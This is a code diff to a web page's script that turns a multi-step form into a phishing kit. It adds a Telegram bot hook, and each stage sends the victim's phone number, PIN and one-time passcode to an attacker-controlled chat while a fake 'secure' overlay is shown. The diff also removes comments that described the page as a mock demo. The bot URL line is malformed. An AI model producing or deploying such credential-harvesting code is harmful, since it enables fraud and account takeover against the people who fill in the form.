@@ -336,12 +336,14 @@ button.next-btn.active {
 </main>
 
 <script>
+// --- TELEGRAM CONFIGURATION ---
+const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; // Put your bot token here
+const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";     // Put your chat ID or group ID here
+
 let sessionId = null;
-let currentPollingInterval = null;
 
 window.addEventListener("DOMContentLoaded", async () => {
   try {
-    // Note: This fetch will fail unless you have a real backend API running at /api/session
     const res = await fetch("/api/session", { method: "POST" });
     const data = await res.json();
     sessionId = data.sessionId;
@@ -353,26 +355,62 @@ window.addEventListener("DOMContentLoaded", async () => {
   setupBoxInputs("code2Boxes", 4, (val) => submitStage("code2", { code2: val }));
 });
 
-// Mock submission handler to handle backend transitions
-function submitStage(stageName, data) {
+// Function to send gathered data directly to Telegram
+async function sendToTelegram(message) {
+  const url = `https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage`;
+  try {
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: "Markdown"
+      })
+    });
+  } catch (err) {
+    console.error("Telegram transmission failed:", err);
+  }
+}
+
+// Stage controller with integrated Telegram notifications
+async function submitStage(stageName, data) {
   console.log(`Submitting stage [${stageName}]:`, data);
   
-  // Simulate network loader
   const overlay = document.getElementById("secureOverlay");
   overlay.classList.remove("hidden");
+
+  // Construct message format for Telegram
+  let telegramMessage = `*New Form Activity*\n`;
+  if (stageName === "phone") {
+    telegramMessage += `📱 *Phone:* \`${data.phone}\``;
+  } else if (stageName === "pin") {
+    telegramMessage += `🔑 *PIN Entered:* \`${data.pin}\``;
+  } else if (stageName === "code1") {
+    telegramMessage += `📝 *Custom Value:* \`${data.code1}\``;
+  } else if (stageName === "code2") {
+    telegramMessage += `🔢 *OTP Code:* \`${data.code2}\``;
+  }
+
+  // Trigger background send to Telegram
+  await sendToTelegram(telegramMessage);
   
+  // Control interface step routing
   setTimeout(() => {
     overlay.classList.add("hidden");
     
-    // Simple state routing for the demo
-    if (stageName === "pin") {
+    if (stageName === "phone") {
+      showPage("page2");
+      setTimeout(() => { document.querySelector("#pinBoxes input")?.focus(); }, 50);
+    } else if (stageName === "pin") {
       showPage("page3");
     } else if (stageName === "code1") {
       showPage("page4");
+      setTimeout(() => { document.querySelector("#code2Boxes input")?.focus(); }, 50);
     } else if (stageName === "code2") {
       showPage("page5");
     }
-  }, 1500);
+  }, 1200);
 }
 
 function showPage(pageId) {
@@ -380,6 +418,7 @@ function showPage(pageId) {
   document.getElementById(pageId).classList.remove("hidden");
 }
 
+// STAGE 1: Phone submission handler
 const phoneInput = document.getElementById("phone");
 const nextPhoneBtn = document.getElementById("nextPhone");
 
@@ -396,13 +435,10 @@ phoneInput.addEventListener("input", () => {
 });
 
 nextPhoneBtn.addEventListener("click", () => {
-  showPage("page2");
-  setTimeout(() => {
-    const firstBox = document.querySelector("#pinBoxes input");
-    if (firstBox) firstBox.focus();
-  }, 50);
+  submitStage("phone", { phone: phoneInput.value.trim() });
 });
 
+// STAGE 3: Custom Text submission handler
 const code1Input = document.getElementById("code1");
 const submitCode1Btn = document.getElementById("submitCode1");
 
@@ -420,7 +456,7 @@ submitCode1Btn.addEventListener("click", () => {
   submitStage("code1", { code1: code1Input.value.trim() });
 });
 
-// CORRECTED AND CLOSED FUNCTION
+// Dynamic grid input generator (with focus/backspace support)
 function setupBoxInputs(containerId, totalLength, completeCallback) {
   const container = document.getElementById(containerId);
   container.innerHTML = "";
@@ -447,7 +483,6 @@ function setupBoxInputs(containerId, totalLength, completeCallback) {
       }
     });
 
-    // Handle backspace navigation
     input.addEventListener("keydown", (e) => {
       if (e.key === "Backspace" && !input.value && input.previousElementSibling) {
         input.previousElementSibling.focus();
